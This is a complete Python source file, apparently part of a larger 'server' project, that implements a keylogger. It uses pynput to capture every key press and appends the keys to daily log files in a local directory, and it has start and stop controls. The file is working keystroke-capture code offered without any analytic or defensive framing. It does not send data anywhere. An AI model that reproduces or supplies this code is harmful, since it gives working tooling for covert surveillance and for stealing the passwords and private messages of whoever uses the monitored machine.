# server/keylogger.py
from pynput import keyboard
import logging
import os
import threading
import time

class Keylogger:
    def __init__(self, log_dir="keylogs"):
        self.log_dir = log_dir
        if not os.path.exists(log_dir):
            os.makedirs(log_dir)

        self.log_file = os.path.join(
            log_dir,
            f"keylog_{time.strftime('%Y%m%d')}.txt"
        )

        self.logging = False
        self.listener = None

    def on_press(self, key):
        try:
            with open(self.log_file, "a") as f:
                if hasattr(key, 'char'):
                    f.write(key.char)
                else:
                    f.write(f'[{str(key)}]')
        except Exception as e:
            print(f"Logging error: {e}")

    def start(self):
        if not self.logging:
            self.logging = True
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()

    def stop(self):
        if self.logging:
            self.logging = False
            if self.listener:
                self.listener.stop()